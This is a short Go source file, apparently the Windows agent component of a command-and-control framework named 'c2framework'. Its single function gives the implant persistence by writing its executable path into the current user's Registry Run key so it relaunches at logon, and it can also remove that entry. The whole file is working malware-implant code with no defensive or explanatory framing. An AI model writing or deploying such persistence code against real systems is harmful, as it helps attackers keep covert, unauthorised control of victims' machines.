//go:build windows

package agent

import (
	"fmt"

	"golang.org/x/sys/windows/registry"

	"c2framework/internals/control"
	"c2framework/internals/models"
)

const (
	runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
)

// doPersist handles Registry Run Key persistence on Windows
func doPersist(args control.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{}

	// Open the Run key
	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to open registry key: %v", err)
		return result
	}
	defer key.Close()

	if args.Remove {
		// Remove the registry value
		err = key.DeleteValue(args.Name)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to delete registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Removed registry persistence '%s'", args.Name)
	} else {
		// Set the registry value to our executable path
		err = key.SetStringValue(args.Name, args.AgentPath)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to set registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Installed registry persistence '%s' -> %s", args.Name, args.AgentPath)
	}

	return result
}
